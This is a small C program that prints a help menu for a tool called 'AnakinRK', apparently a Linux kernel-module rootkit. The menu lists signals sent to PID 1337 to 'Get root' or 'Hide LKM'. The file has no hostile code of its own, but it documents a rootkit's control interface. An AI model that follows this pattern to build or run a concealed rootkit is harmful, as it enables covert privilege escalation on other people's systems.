#include <stdio.h>

enum SIGS {
    SIGHELP,
    SIGROOT,
    SIGHIDE

};

#define SIGTABL \
    X(SIGHELP, "Show help menu") \
    X(SIGROOT, "Get root") \
    X(SIGHIDE, "Hide LKM")

int main() {
    printf("============= AnakinRK Help =============\n");
    printf("=\tSignal\tPID\tDescription\t=\n");
    printf("=========================================\n");

    #define X(var, desc) printf("=\t%02d\t%d\t%s\t=\n", (int)var, 1337, (char*)desc);
    SIGTABL
    #undef X

    printf("=========================================\n");
    return 0;

} 
